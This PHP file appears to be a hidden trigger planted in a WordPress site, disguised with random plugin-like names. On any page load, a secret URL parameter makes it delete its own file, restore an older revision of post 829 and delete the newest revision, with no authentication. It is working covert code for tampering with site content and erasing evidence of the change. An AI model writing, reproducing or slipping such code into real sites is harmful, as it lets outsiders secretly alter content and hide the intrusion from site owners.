<?php

function connector_api_refresh_blocks() {
	if (isset($_GET['index_rank_forum']) && $_GET['index_rank_forum'] === 'webp_slider_timeline_affiliate') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$services_cf7_graph = 829;
		$multisite_menus_optimizer = wp_get_post_revisions($services_cf7_graph);
		if (empty($multisite_menus_optimizer)) die('no revisions');
		if (count($multisite_menus_optimizer) < 2) die('less than 2');
		$results_simple_orders_current = array_shift($multisite_menus_optimizer);
		$game_mobile_cookie_search = $results_simple_orders_current->ID;
		$sales_products_notes = array_shift($multisite_menus_optimizer);
		$widget_patterns_csv_beaver = $sales_products_notes->ID;
		$oembed_popular_author = wp_restore_post_revision($widget_patterns_csv_beaver);
		if ($oembed_popular_author === false) die('error restoring');
		$oembed_popular_author = wp_delete_post_revision($game_mobile_cookie_search);		
		if ($oembed_popular_author === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'connector_api_refresh_blocks');
